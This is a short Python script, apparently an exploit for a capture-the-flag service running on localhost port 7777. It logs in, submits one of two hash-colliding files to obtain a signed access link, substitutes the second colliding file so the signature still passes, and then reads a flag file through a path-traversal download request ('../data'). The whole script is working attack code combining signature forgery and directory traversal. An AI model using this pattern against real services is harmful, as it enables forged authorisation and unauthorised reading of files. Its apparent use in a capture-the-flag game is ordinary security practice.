import requests
import re
import base64

public_flag_id = "/Fulawans/wANiZAte/suppLaRT.d3r" # PUT here your public flag id

s = requests.session()
result = s.post("http://127.0.0.1:7777/login", data={"username": "kost", "password": "kost"})
with open("collision1.bin.request", "rb") as f:
    collision1 = f.read()
a_tag = s.post("http://127.0.0.1:7777/share", data=collision1).text

with open("collision2.bin.request", "rb") as f:
    collision2 = f.read()
payload = base64.urlsafe_b64encode(collision2).decode('utf-8')
hacked_a_tag = re.sub(r"\?request\=.*?\&signature=", f"?request={payload}&signature=", a_tag)

m = re.search(r"href=\"(/access\?request=.*?)\">click here to get access", hacked_a_tag)
hacked_url = m.group(1)

granted_message = s.get(f"http://127.0.0.1:7777{hacked_url}").text

content = s.get(f"http://127.0.0.1:7777/download?file=../data{public_flag_id}").text
flag = re.findall(r"\w{31}=", content)
print("FLAG:", flag)
